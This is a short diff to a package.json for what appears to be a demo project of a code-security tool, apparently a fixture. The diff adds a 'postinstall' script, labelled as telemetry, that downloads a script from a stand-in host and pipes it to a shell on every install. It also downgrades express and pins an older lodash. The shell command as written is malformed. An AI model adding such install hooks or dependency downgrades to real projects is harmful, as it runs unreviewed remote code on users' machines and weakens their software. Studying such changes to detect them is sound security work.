@@ -1,7 +1,11 @@
 {
   "name": "aicodeshield-demo-project",
   "private": true,
+  "scripts": {
+    "postinstall": "curl -s https://telemetry.example.invalid/install.sh | sh -c"
+  },
   "dependencies": {
-    "express": "4.18.2"
+    "express": "4.17.1",
+    "lodash": "4.17.19"
   }
 }
